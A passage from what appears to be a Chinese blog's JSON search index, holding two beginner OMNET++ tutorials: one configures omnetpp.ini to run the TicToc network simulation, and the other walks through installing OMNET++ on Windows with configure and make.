不难看出该消息就像一只乒乓球，将在两个节点间来回传输。不过请注意，此模拟中没有内置停止条件：它将永远持续。你可以在 IDE 上让它停止运行。\n5 配置 omn​​etpp.ini # 为了能够运行模拟，我们需要创建omnetpp.ini文件。omnetpp.ini告诉仿真程序要模拟哪个网络（因为 ned 文件可能包含多个网络），可以将参数传递给模型，显式指定随机数生成器的种子等。\n从菜单里选择 File -\u0026gt; New -\u0026gt; Initialization file (INI) 创建omnetpp.ini文件。新文件将在 IniFile 编辑器中打开。作为 ned 编辑器，inifile 编辑器还有两种模式，Form和Source，用于编辑相同的内容。前者更适合配置仿真内核，后者更适合输入模块参数。\n现在，只需切换到 Source 模式并输入以下内容：\n[General] network = Tictoc1 点击 Run 或使用快捷键 Ctrl+F11 运行，可能弹出两个提示框，不用管他，直接运行即可，最后会弹出一个窗口来显示仿真结果，效果如图。\n下一节我会着重讲一下模拟的过程。就说到这里吧，有什么问题大家可以通过评论区联系我。\n","date":"2019年9月26日","externalUrl":null,"permalink":"/posts/omnet-ru-men-jiao-cheng-2/","section":"","summary":"本文将介绍如何使用 OMNET++ 来创建一个简单的模型","title":"OMNET++入门教程|第1章 —— TicToc模型","type":"posts"},{"content":"","date":"2019年9月26日","externalUrl":null,"permalink":"/tags/tictoc/","section":"Tags","summary":"","title":"TicToc","type":"tags"},{"content":"","date":"2019年9月26日","externalUrl":null,"permalink":"/tags/%E4%BB%BF%E7%9C%9F/","section":"Tags","summary":"","title":"仿真","type":"tags"},{"content":" OMNET++入门教程|第 0 章——安装 # 最近需要学的东西不少，于是准备写点什么。正好最近在研究通信协议方面的知识，老师建议学一学 OMNET++，正好网上的相关资料比较少，我自己也写点什么。\n下载 # 首先第一步去官网下载，打开 OMNET++的官网，选择右上角的 Download，选择合适的版本来进行下载，比如我就是 Windows 10 64 位，就需要下载 Windows 版本 安装 # 下载完成后是一个压缩包，在合适的目录解压后，第一次遇到下载软件的压缩包里面没有安装包，感觉还是束手无策的，赶紧上网查了查，终于知道了具体怎么安装，首先先给一张图片 这个图片写的已经很清楚了，首先双击运行mingwenv.cmd，然后文件会自动解压，按照其他网站的理论，可能你需要先安装 G++之类的编译器，但是我没有遇到这个情况，如果有人遇到什么情况也可以在评论区留言给我。\n编译运行 # 第二步就是输入./configure这个命令，它会自动执行，最后出现 Good！ 之类的话，说明这一步成功了。然后接着输入make命令来进行编译，时间非常长，耐心等待，等屏幕上输出 Now you can type “omnetpp” to start the IDE 字样，说明安装完成了，可以直接输入omnetpp打开 IDE。然后因为我比较懒，相信它应该有实体的 exe，然后就找了起来。这个时候我其实下意识的进入./bin这个文件夹，因为这个文件夹通常是用来存放二进制文件的，但是发现里面没有 IDE，是因为其实这个软件没有 IDE 应该也能运行（我想不出一个仿真软件在没有 IDE 的情况下是怎么仿真的），真正的 IDE 是在./ide这个文件夹当中的，这个时候可以建立一个快捷方式放在根目录，更方便。就不用每次通过进命令行输入omnetpp进入 IDE 了。\n感想 # 具体安装过程虽然不如安装包点点简单，但是还是蛮简单的，但是我没有在官方文档找到相关教程，可能还是有点欠缺吧。就说到这里吧，有什么问题大家可以通过评论区联系我，或者直接通过右面的 Daovoice 联系我（最好是评论区，那个我可能不看），下次我将介绍一个简单的例子来入门 OMNET++。\n","date":"2019年9月24日","externalUrl":null,"permalink":"/posts/omnet-ru-men-jiao-cheng/","section":"","summary":"OMNET++是一个用于网络仿真的工具，本文将介绍如何安装 OMNET++","title":"OMNET++入门教程|第0章——安装","type":"posts"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"}]